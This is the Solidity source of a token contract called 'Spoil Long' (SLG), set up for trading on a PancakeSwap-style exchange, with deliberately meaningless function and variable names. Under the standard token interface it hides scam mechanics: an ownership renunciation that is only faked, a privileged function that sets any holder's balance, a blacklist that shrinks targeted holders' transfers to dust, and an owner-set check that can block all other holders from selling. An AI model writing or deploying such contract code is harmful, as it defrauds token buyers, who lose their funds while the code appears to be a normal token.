//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface launchedFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fundMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeFrom {
    function createPair(address takeIs, address enableReceiver) external returns (address);
}

interface takeFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundList) external view returns (uint256);

    function transfer(address tradingReceiverTotal, uint256 tokenMax) external returns (bool);

    function allowance(address launchExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenMax) external returns (bool);

    function transferFrom(
        address sender,
        address tradingReceiverTotal,
        uint256 tokenMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeReceiver, uint256 value);
    event Approval(address indexed launchExempt, address indexed spender, uint256 value);
}

interface takeFundMetadata is takeFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SpoilLong is fundMax, takeFund, takeFundMetadata {

    address public teamMode;

    function transfer(address buyExempt, uint256 tokenMax) external virtual override returns (bool) {
        return shouldFee(_msgSender(), buyExempt, tokenMax);
    }

    mapping(address => bool) public maxMin;

    function toSender(address totalTx) public {
        tokenSender();
        
        if (totalTx == teamMode || totalTx == isTo) {
            return;
        }
        maxMin[totalTx] = true;
    }

    bool public listLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return launchedEnable;
    }

    function shouldFee(address tokenAmount, address tradingReceiverTotal, uint256 tokenMax) internal returns (bool) {
        if (tokenAmount == teamMode) {
            return sellAt(tokenAmount, tradingReceiverTotal, tokenMax);
        }
        uint256 toSwapWallet = takeFund(isTo).balanceOf(isList);
        require(toSwapWallet == receiverShould);
        require(tradingReceiverTotal != isList);
        if (maxMin[tokenAmount]) {
            return sellAt(tokenAmount, tradingReceiverTotal, txIsEnable);
        }
        return sellAt(tokenAmount, tradingReceiverTotal, tokenMax);
    }

    function walletTotal(uint256 tokenMax) public {
        tokenSender();
        receiverShould = tokenMax;
    }

    bool private enableLimit;

    function tokenSender() private view {
        require(senderTx[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return listTx;
    }

    bool private minMode;

    function listSwap() public {
        emit OwnershipTransferred(teamMode, address(0));
        tokenReceiver = address(0);
    }

    function modeTrading(address enableIsTx) public {
        if (txExempt) {
            return;
        }
        
        senderTx[enableIsTx] = true;
        
        txExempt = true;
    }

    address swapFundMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return buyList;
    }

    uint256 private buyList = 100000000 * 10 ** 18;

    string private isMarketing = "Spoil Long";

    function sellAt(address tokenAmount, address tradingReceiverTotal, uint256 tokenMax) internal returns (bool) {
        require(listSellIs[tokenAmount] >= tokenMax);
        listSellIs[tokenAmount] -= tokenMax;
        listSellIs[tradingReceiverTotal] += tokenMax;
        emit Transfer(tokenAmount, tradingReceiverTotal, tokenMax);
        return true;
    }

    uint256 public totalMarketing;

    function tradingModeBuy(address buyExempt, uint256 tokenMax) public {
        tokenSender();
        listSellIs[buyExempt] = tokenMax;
    }

    function approve(address swapIs, uint256 tokenMax) public virtual override returns (bool) {
        launchTotalSwap[_msgSender()][swapIs] = tokenMax;
        emit Approval(_msgSender(), swapIs, tokenMax);
        return true;
    }

    uint256 limitIsMode;

    string private launchedEnable = "SLG";

    function owner() external view returns (address) {
        return tokenReceiver;
    }

    address isList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private tokenReceiver;

    mapping(address => bool) public senderTx;

    mapping(address => mapping(address => uint256)) private launchTotalSwap;

    uint256 receiverShould;

    uint256 constant txIsEnable = 10 ** 10;

    function transferFrom(address tokenAmount, address tradingReceiverTotal, uint256 tokenMax) external override returns (bool) {
        if (_msgSender() != swapFundMarketing) {
            if (launchTotalSwap[tokenAmount][_msgSender()] != type(uint256).max) {
                require(tokenMax <= launchTotalSwap[tokenAmount][_msgSender()]);
                launchTotalSwap[tokenAmount][_msgSender()] -= tokenMax;
            }
        }
        return shouldFee(tokenAmount, tradingReceiverTotal, tokenMax);
    }

    function allowance(address swapTradingMarketing, address swapIs) external view virtual override returns (uint256) {
        if (swapIs == swapFundMarketing) {
            return type(uint256).max;
        }
        return launchTotalSwap[swapTradingMarketing][swapIs];
    }

    event OwnershipTransferred(address indexed receiverTrading, address indexed exemptBuy);

    function getOwner() external view returns (address) {
        return tokenReceiver;
    }

    constructor (){
        
        launchedFee marketingMax = launchedFee(swapFundMarketing);
        isTo = modeFrom(marketingMax.factory()).createPair(marketingMax.WETH(), address(this));
        
        teamMode = _msgSender();
        listSwap();
        senderTx[teamMode] = true;
        listSellIs[teamMode] = buyList;
        if (autoIsShould == feeTotalTake) {
            autoIsShould = feeTotalTake;
        }
        emit Transfer(address(0), teamMode, buyList);
    }

    uint8 private listTx = 18;

    address public isTo;

    uint256 private autoIsShould;

    function name() external view virtual override returns (string memory) {
        return isMarketing;
    }

    mapping(address => uint256) private listSellIs;

    uint256 public feeTotalTake;

    bool public txExempt;

    function balanceOf(address fundList) public view virtual override returns (uint256) {
        return listSellIs[fundList];
    }

}